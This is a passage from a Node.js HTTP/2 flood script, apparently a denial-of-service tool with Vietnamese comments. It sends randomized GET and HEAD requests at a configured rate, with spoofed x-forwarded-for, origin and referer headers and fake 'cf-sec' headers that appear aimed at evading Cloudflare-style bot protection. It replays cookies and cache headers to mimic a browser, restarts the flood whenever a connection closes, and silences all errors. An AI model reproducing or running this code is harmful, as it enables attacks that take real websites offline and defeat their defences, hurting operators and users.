                                const method = Math.random() < 0.9 ? "GET" : "HEAD";

                                const dynamicHeaders = {
                                    ...(Math.random() < 0.3 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }), // Giảm từ 0.4
                                    ...(Math.random() < 0.2 && { "referer": "https://" + clength }), // Giảm từ 0.75
                                    ...(Math.random() < 0.2 && { // Giảm từ 0.75
                                        "origin": Math.random() < 0.5 ?
                                            "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/') :
                                            "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength
                                    }),
                                    ...(Math.random() < 0.3 && { ['cf-sec-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }), // Giảm từ 0.5
                                    ...(Math.random() < 0.3 && { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }), // Giảm từ 0.5
                                    "RTT": "1",
                                    ...(Math.random() < 0.3 ? taoDoiTuongNgauNhien() : {}), // Giảm từ 0.5
                                };

                                const finalHeaders = {
                                    ":method": method,
                                    ":authority": baseHeaders[":authority"],
                                    ":scheme": baseHeaders[":scheme"],
                                    ":path": selectedPath,
                                    ...baseHeaders,
                                    ...dynamicHeaders,
                                    "sec-fetch-dest": secFetchDest,
                                };

                                const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
                                if (cookieHeader) {
                                    finalHeaders['cookie'] = cookieHeader;
                                }

                                const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
                                if (cachedInfo) {
                                    if (cachedInfo.etag) {
                                        finalHeaders['if-none-match'] = cachedInfo.etag;
                                    }
                                    if (cachedInfo.lastModified) {
                                        finalHeaders['if-modified-since'] = cachedInfo.lastModified;
                                    }
                                }

                                if (Math.random() < 0.05) delete finalHeaders["accept-encoding"]; // 5% bỏ header

                                Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);

                                const req = client.request(finalHeaders, {
                                    weight: Math.random() < 0.5 ? 251 : 231,
                                    depends_on: 0,
                                    exclusive: Math.random() < 0.5 ? true : false,
                                })
                                .on('response', response => {
                                    const setCookie = response['set-cookie'];
                                    if (setCookie) {
                                        sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
                                    }

                                    const etag = response['etag'];
                                    const lastModified = response['last-modified'];
                                    if (etag || lastModified) {
                                        sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
                                    }

                                    req.close(http2.constants.NO_ERROR);
                                    req.destroy();
                                    resolve();
                                })
                                .on('error', (err) => {
                                    reject(err);
                                });

                                req.on('end', () => {
                                    resolve();
                                });

                                req.end();
                                await new Promise(resolve => setTimeout(resolve, getRandomInt(50, 500))); // Thêm độ trễ
                            });
                            await requestPromise.catch(() => {});
                        }
                    }
                }

                sendRequests();
            }, 1000 / args.Rate); // Điều chỉnh interval dựa trên Rate
        });

        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            runFlooder();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});